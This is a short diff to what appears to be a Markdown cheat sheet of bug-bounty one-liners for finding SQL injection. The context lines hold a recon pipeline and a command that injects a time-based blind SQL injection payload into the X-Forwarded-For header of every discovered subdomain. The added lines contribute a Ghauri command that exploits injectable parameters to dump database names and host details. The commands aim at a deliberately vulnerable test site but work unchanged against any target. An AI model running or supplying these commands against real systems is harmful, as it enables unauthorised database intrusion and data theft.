@@ -71,6 +71,12 @@ waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace "FUZZ" | gf sqli | sort 
 subfinder -d vulnweb.com -recursive -all -silent | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | tee -a header_based_bsqli.txt
 ```
 
+## Ghauri SQLi finder
+
+```
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --dbs --current-db --hostname | tee ghauri.sqli.txt
+```
+
 
 
 
